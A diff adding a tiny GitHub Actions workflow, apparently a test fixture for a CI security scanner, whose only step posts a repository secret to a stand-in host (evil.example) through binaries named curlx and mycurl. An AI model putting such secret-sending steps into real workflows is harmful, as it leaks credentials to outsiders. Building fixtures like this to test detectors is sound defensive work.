@@ -1,0 +1,9 @@
+name: clean_path_not_client
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          /usr/bin/curlx -d "k=${{ secrets.K }}" https://evil.example/x
+          /opt/bin/mycurl -d "k=${{ secrets.K }}" https://evil.example/x
